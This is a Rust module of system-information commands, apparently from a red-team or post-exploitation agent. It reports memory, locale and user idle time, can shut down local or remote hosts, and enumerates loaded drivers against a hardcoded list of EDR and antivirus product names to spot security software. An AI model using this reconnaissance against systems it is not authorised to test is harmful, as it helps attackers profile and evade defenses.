/// System information commands.
/// Windows: native Win32 API. Linux: fallback to shell / /proc.

// ── resources ────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn resources(_args: &[String]) -> anyhow::Result<String> {
    use windows_sys::Win32::System::SystemInformation::*;
    use std::mem;

    unsafe {
        // Memory via GlobalMemoryStatusEx
        let mut mem_status: MEMORYSTATUSEX = mem::zeroed();
        mem_status.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem_status) == 0 {
            anyhow::bail!("GlobalMemoryStatusEx failed");
        }

        let total_gb = mem_status.ullTotalPhys as f64 / (1024.0 * 1024.0 * 1024.0);
        let avail_gb = mem_status.ullAvailPhys as f64 / (1024.0 * 1024.0 * 1024.0);
        let used_pct = mem_status.dwMemoryLoad;

        // Disk via GetDiskFreeSpaceExW
        let path_w = super::winapi_helpers::win::to_wide("C:\\");
        let mut free_bytes: u64 = 0;
        let mut total_bytes: u64 = 0;
        let mut total_free: u64 = 0;

        use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
        GetDiskFreeSpaceExW(
            path_w.as_ptr(),
            &mut free_bytes as *mut u64 as *mut _,
            &mut total_bytes as *mut u64 as *mut _,
            &mut total_free as *mut u64 as *mut _,
        );

        let disk_total_gb = total_bytes as f64 / (1024.0 * 1024.0 * 1024.0);
        let disk_free_gb = free_bytes as f64 / (1024.0 * 1024.0 * 1024.0);

        Ok(format!(
            "Memory: {:.2} GB available / {:.2} GB total ({}% used)\nDisk C: {:.2} GB free / {:.2} GB total",
            avail_gb, total_gb, used_pct, disk_free_gb, disk_total_gb
        ))
    }
}

#[cfg(not(windows))]
pub fn resources(_args: &[String]) -> anyhow::Result<String> {
    let mut out = String::new();
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        for line in meminfo.lines().take(3) {
            out.push_str(line);
            out.push('\n');
        }
    }
    let (df_out, _) = crate::exec::exec("df", &["-h".into(), "/".into()]);
    out.push_str(&df_out);
    Ok(out)
}

// ── locale ───────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn locale(_args: &[String]) -> anyhow::Result<String> {
    use windows_sys::Win32::Globalization::*;
    use super::winapi_helpers::win;
    use std::mem;

    // TIME_ZONE_INFORMATION and GetTimeZoneInformation — define manually
    #[repr(C)]
    struct TimeZoneInformation {
        bias: i32,
        standard_name: [u16; 32],
        standard_date: [u16; 8], // SYSTEMTIME
        standard_bias: i32,
        daylight_name: [u16; 32],
        daylight_date: [u16; 8], // SYSTEMTIME
        daylight_bias: i32,
    }
    type GetTimeZoneInformationFn = unsafe extern "system" fn(*mut TimeZoneInformation) -> u32;
    let get_tz: GetTimeZoneInformationFn = unsafe {
        win::get_proc("kernel32.dll", "GetTimeZoneInformation")?
    };

    unsafe {
        // Locale name
        let mut locale_buf = [0u16; 85];
        let len = GetLocaleInfoW(
            LOCALE_USER_DEFAULT,
            LOCALE_SNAME,
            locale_buf.as_mut_ptr(),
            locale_buf.len() as i32,
        );
        let locale_name = if len > 0 {
            win::from_wide(locale_buf.as_ptr())
        } else {
            "Unknown".into()
        };

        // Language display name
        let mut lang_buf = [0u16; 256];
        let len2 = GetLocaleInfoW(
            LOCALE_USER_DEFAULT,
            LOCALE_SLOCALIZEDLANGUAGENAME,
            lang_buf.as_mut_ptr(),
            lang_buf.len() as i32,
        );
        let lang_name = if len2 > 0 {
            win::from_wide(lang_buf.as_ptr())
        } else {
            "Unknown".into()
        };

        // Date format
        let mut date_buf = [0u16; 80];
        let len3 = GetLocaleInfoW(
            LOCALE_USER_DEFAULT,
            LOCALE_SSHORTDATE,
            date_buf.as_mut_ptr(),
            date_buf.len() as i32,
        );
        let date_fmt = if len3 > 0 {
            win::from_wide(date_buf.as_ptr())
        } else {
            "Unknown".into()
        };

        // Time format
        let mut time_buf = [0u16; 80];
        let len4 = GetLocaleInfoW(
            LOCALE_USER_DEFAULT,
            LOCALE_SSHORTTIME,
            time_buf.as_mut_ptr(),
            time_buf.len() as i32,
        );
        let time_fmt = if len4 > 0 {
            win::from_wide(time_buf.as_ptr())
        } else {
            "Unknown".into()
        };

        // Timezone
        let mut tz: TimeZoneInformation = mem::zeroed();
        let tz_id = get_tz(&mut tz);
        let tz_name = match tz_id {
            1 => win::from_wide(tz.standard_name.as_ptr()),
            2 => win::from_wide(tz.daylight_name.as_ptr()),
            _ => win::from_wide(tz.standard_name.as_ptr()),
        };
        let utc_offset = -(tz.bias);

        // Current date/time
        let mut st: windows_sys::Win32::Foundation::SYSTEMTIME = mem::zeroed();
        windows_sys::Win32::System::SystemInformation::GetLocalTime(&mut st);

        Ok(format!(
            "Language   : {}\nLocale     : {}\nDateFormat : {}\nTimeFormat : {}\nTimeZone   : {} (UTC{:+} min)\nCurrentDate: {:04}-{:02}-{:02} {:02}:{:02}:{:02}",
            lang_name, locale_name, date_fmt, time_fmt,
            tz_name, utc_offset,
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        ))
    }
}

#[cfg(not(windows))]
pub fn locale(_args: &[String]) -> anyhow::Result<String> {
    let (stdout, _) = crate::exec::exec("locale", &[]);
    Ok(stdout)
}

// ── useridletime ─────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn useridletime(_args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;

    // GetLastInputInfo from user32.dll — not always in windows-sys feature set
    #[repr(C)]
    struct LASTINPUTINFO {
        cb_size: u32,
        dw_time: u32,
    }
    type GetLastInputInfoFn = unsafe extern "system" fn(*mut LASTINPUTINFO) -> i32;
    type GetTickCountFn = unsafe extern "system" fn() -> u32;

    let get_last_input: GetLastInputInfoFn = unsafe {
        win::get_proc("user32.dll", "GetLastInputInfo")?
    };
    let get_tick: GetTickCountFn = unsafe {
        win::get_proc("kernel32.dll", "GetTickCount")?
    };

    unsafe {
        let mut lii = LASTINPUTINFO {
            cb_size: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dw_time: 0,
        };
        if get_last_input(&mut lii) == 0 {
            anyhow::bail!("GetLastInputInfo failed");
        }

        let tick = get_tick();
        let idle_ms = tick.wrapping_sub(lii.dw_time);

        let secs = idle_ms / 1000;
        let days = secs / 86400;
        let hours = (secs % 86400) / 3600;
        let mins = (secs % 3600) / 60;
        let s = secs % 60;

        Ok(format!("User idle time: {}d {}h {}m {}s", days, hours, mins, s))
    }
}

#[cfg(not(windows))]
pub fn useridletime(_args: &[String]) -> anyhow::Result<String> {
    let (stdout, _) = crate::exec::exec("sh", &[
        "-c".into(),
        "w -h | awk '{print $1, \"idle:\", $5}'".into(),
    ]);
    Ok(stdout)
}

// ── shutdown ─────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn shutdown(args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;

    // InitiateSystemShutdownExW from advapi32.dll
    type InitiateSystemShutdownExWFn = unsafe extern "system" fn(
        machine: *const u16,
        message: *const u16,
        timeout: u32,
        force_close: i32,
        reboot: i32,
        reason: u32,
    ) -> i32;

    let initiate_shutdown: InitiateSystemShutdownExWFn = unsafe {
        win::get_proc("advapi32.dll", "InitiateSystemShutdownExW")?
    };

    let host = args.get(0).filter(|s| !s.is_empty());
    let message = args.get(1).filter(|s| !s.is_empty());
    let timeout: u32 = args.get(2)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    let reboot = args.get(3).map(|s| s == "1").unwrap_or(false);

    let host_w: Option<Vec<u16>> = host.map(|h| {
        let unc = format!("\\\\{}", h);
        win::to_wide(&unc)
    });
    let host_ptr = host_w.as_ref().map_or(std::ptr::null(), |v| v.as_ptr());

    let msg_w: Option<Vec<u16>> = message.map(|m| win::to_wide(m));
    let msg_ptr = msg_w.as_ref().map_or(std::ptr::null(), |v| v.as_ptr());

    // SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED
    let reason: u32 = 0x80000000 | 0x00000000 | 0x00000000;

    unsafe {
        let ret = initiate_shutdown(
            host_ptr, msg_ptr, timeout,
            1, // force close apps
            if reboot { 1 } else { 0 },
            reason,
        );
        if ret == 0 {
            anyhow::bail!("InitiateSystemShutdownExW failed: {}", win::win32_error_string(
                windows_sys::Win32::Foundation::GetLastError()
            ));
        }
    }

    let action = if reboot { "Reboot" } else { "Shutdown" };
    let target = host.map(|s| s.as_str()).unwrap_or("localhost");
    Ok(format!("{} initiated on {} (timeout: {}s)", action, target, timeout))
}

#[cfg(not(windows))]
pub fn shutdown(args: &[String]) -> anyhow::Result<String> {
    let reboot = args.get(3).map(|s| s == "1").unwrap_or(false);
    let cmd_args = if reboot {
        vec!["-r".into(), "now".into()]
    } else {
        vec!["-h".into(), "now".into()]
    };
    let (stdout, stderr) = crate::exec::exec("shutdown", &cmd_args);
    if !stderr.is_empty() && stdout.is_empty() { anyhow::bail!("{}", stderr.trim()); }
    Ok(if stdout.is_empty() { "Shutdown initiated".into() } else { stdout })
}

// ── driversigs ───────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn driversigs(_args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;

    // EnumDeviceDrivers + GetDeviceDriverBaseNameW from psapi (kernel32 on Win7+)
    type EnumDeviceDriversFn = unsafe extern "system" fn(
        image_base: *mut *mut std::ffi::c_void,
        cb: u32,
        needed: *mut u32,
    ) -> i32;
    type GetDeviceDriverBaseNameWFn = unsafe extern "system" fn(
        image_base: *mut std::ffi::c_void,
        base_name: *mut u16,
        size: u32,
    ) -> u32;
    type GetDeviceDriverFileNameWFn = unsafe extern "system" fn(
        image_base: *mut std::ffi::c_void,
        filename: *mut u16,
        size: u32,
    ) -> u32;

    let enum_drivers: EnumDeviceDriversFn = unsafe {
        win::get_proc("psapi.dll", "EnumDeviceDrivers")?
    };
    let get_basename: GetDeviceDriverBaseNameWFn = unsafe {
        win::get_proc("psapi.dll", "GetDeviceDriverBaseNameW")?
    };
    let get_filename: GetDeviceDriverFileNameWFn = unsafe {
        win::get_proc("psapi.dll", "GetDeviceDriverFileNameW")?
    };

    let edr_drivers = [
        "crowdstrike", "csagent", "csfalcon",
        "cylance", "cyoptics", "cyprotect",
        "sentinel", "sentinelone",
        "carbon", "cb.exe", "cbstream",
        "sophos", "hmpalert",
        "symantec", "ccsvchst", "sepwsc",
        "mcafee", "mfehidk", "mfefirek",
        "defender", "mpfilter", "msmpeng",
        "kaspersky", "klif", "kneps",
        "eset", "ekrn", "eamonm",
        "trend", "tmtdi", "tmeext",
        "bitdefender", "bdvedisk",
        "avast", "aswsp", "aswbidsdriver",
        "avg", "avgntflt",
        "webroot", "wrcore",
        "malwarebytes", "mbam",
        "panda", "nanoav", "fsfilter",
    ];

    unsafe {
        let mut needed: u32 = 0;
        enum_drivers(std::ptr::null_mut(), 0, &mut needed);
        if needed == 0 {
            return Ok("No drivers found.".into());
        }

        let count = needed as usize / std::mem::size_of::<*mut std::ffi::c_void>();
        let mut bases: Vec<*mut std::ffi::c_void> = vec![std::ptr::null_mut(); count];
        let ret = enum_drivers(bases.as_mut_ptr(), needed, &mut needed);
        if ret == 0 {
            anyhow::bail!("EnumDeviceDrivers failed");
        }

        let mut all_drivers = Vec::new();
        let mut edr_found = Vec::new();

        for &base in &bases {
            let mut name_buf = [0u16; 260];
            let mut path_buf = [0u16; 520];
            let name_len = get_basename(base, name_buf.as_mut_ptr(), 260);
            let path_len = get_filename(base, path_buf.as_mut_ptr(), 520);

            let name = if name_len > 0 {
                win::from_wide(name_buf.as_ptr())
            } else {
                "(unknown)".into()
            };
            let path = if path_len > 0 {
                win::from_wide(path_buf.as_ptr())
            } else {
                String::new()
            };

            let line = format!("{:<32} {}", name, path);
            let lower = name.to_lowercase();
            for edr in &edr_drivers {
                if lower.contains(edr) {
                    edr_found.push(line.clone());
                    break;
                }
            }
            all_drivers.push(line);
        }

        let mut out = String::from("=== EDR/AV Drivers Found ===\n");
        if edr_found.is_empty() {
            out.push_str("No known EDR/AV drivers detected.\n");
        } else {
            for l in &edr_found {
                out.push_str(l);
                out.push('\n');
            }
        }
        out.push_str(&format!("\n=== All Drivers ({}) ===\n", all_drivers.len()));
        out.push_str(&format!("{:<32} {}\n", "Name", "Path"));
        out.push_str(&"-".repeat(60));
        out.push('\n');
        for l in &all_drivers {
            out.push_str(l);
            out.push('\n');
        }
        Ok(out)
    }
}

#[cfg(not(windows))]
pub fn driversigs(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("driversigs: Windows only")
}

// ── enum_filter_driver ───────────────────────────────────────────────────────

#[cfg(windows)]
pub fn enum_filter_driver(args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;
    use windows_sys::Win32::System::Registry::*;

    // Enumerate minifilter drivers from registry:
    // HKLM\SYSTEM\CurrentControlSet\Services — filter where Type == 2 (FILE_SYSTEM_DRIVER)
    let server = args.first();

    let base_hkey = if let Some(host) = server {
        let host_w = win::to_wide(host);
        let mut remote_key: win::HKEY = std::ptr::null_mut();
        let ret = unsafe {
            RegConnectRegistryW(host_w.as_ptr(), HKEY_LOCAL_MACHINE, &mut remote_key)
        };
        if ret != 0 {
            anyhow::bail!("RegConnectRegistryW failed: error {}", ret);
        }
        remote_key
    } else {
        HKEY_LOCAL_MACHINE
    };

    let subkey = "SYSTEM\\CurrentControlSet\\Services";
    let subkey_w = win::to_wide(subkey);
    let mut services_key: win::HKEY = std::ptr::null_mut();
    let ret = unsafe {
        RegOpenKeyExW(base_hkey, subkey_w.as_ptr(), 0, KEY_READ, &mut services_key)
    };
    if ret != 0 {
        anyhow::bail!("Failed to open Services key: error {}", ret);
    }
    let _guard = win::RegKeyHandle(services_key);

    let mut out = format!("{:<32} {:<16} {}\n", "Driver Name", "Type", "ImagePath");
    out.push_str(&"-".repeat(72));
    out.push('\n');
    let mut count = 0u32;

    // Enumerate subkeys
    let mut idx: u32 = 0;
    loop {
        let mut name_buf = [0u16; 256];
        let mut name_len = 256u32;
        let ret = unsafe {
            RegEnumKeyExW(
                services_key, idx, name_buf.as_mut_ptr(),
                &mut name_len, std::ptr::null_mut(),
                std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
            )
        };
        if ret != 0 { break; }
        idx += 1;

        let svc_name = win::from_wide(name_buf.as_ptr());

        // Open subkey and read Type value
        let svc_key_w = win::to_wide(&svc_name);
        let mut svc_key: win::HKEY = std::ptr::null_mut();
        let ret = unsafe {
            RegOpenKeyExW(services_key, svc_key_w.as_ptr(), 0, KEY_READ, &mut svc_key)
        };
        if ret != 0 { continue; }
        let _svc_guard = win::RegKeyHandle(svc_key);

        // Read Type
        let type_name_w = win::to_wide("Type");
        let mut dtype: u32 = 0;
        let mut type_val: u32 = 0;
        let mut type_size = 4u32;
        let ret = unsafe {
            RegQueryValueExW(
                svc_key, type_name_w.as_ptr(), std::ptr::null(),
                &mut dtype, &mut type_val as *mut u32 as *mut u8, &mut type_size,
            )
        };
        if ret != 0 { continue; }

        // Type 2 = FILE_SYSTEM_DRIVER (minifilter/filter drivers)
        if type_val != 2 { continue; }

        // Read ImagePath
        let img_name_w = win::to_wide("ImagePath");
        let mut img_type: u32 = 0;
        let mut img_size: u32 = 0;
        let ret = unsafe {
            RegQueryValueExW(
                svc_key, img_name_w.as_ptr(), std::ptr::null(),
                &mut img_type, std::ptr::null_mut(), &mut img_size,
            )
        };
        let image_path = if ret == 0 && img_size > 0 {
            let mut img_buf = vec![0u8; img_size as usize];
            let ret = unsafe {
                RegQueryValueExW(
                    svc_key, img_name_w.as_ptr(), std::ptr::null(),
                    &mut img_type, img_buf.as_mut_ptr(), &mut img_size,
                )
            };
            if ret == 0 {
                win::format_reg_data(img_type, &img_buf)
            } else {
                String::new()
            }
        } else {
            String::new()
        };

        out.push_str(&format!("{:<32} {:<16} {}\n", svc_name, "FILE_SYSTEM_DRV", image_path));
        count += 1;
    }

    // Clean up remote key if opened
    if server.is_some() && !base_hkey.is_null() && base_hkey != HKEY_LOCAL_MACHINE {
        unsafe { RegCloseKey(base_hkey); }
    }

    out.push_str(&format!("\nTotal: {} filter drivers", count));
    Ok(out)
}

#[cfg(not(windows))]
pub fn enum_filter_driver(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("enum_filter_driver: Windows only")
}
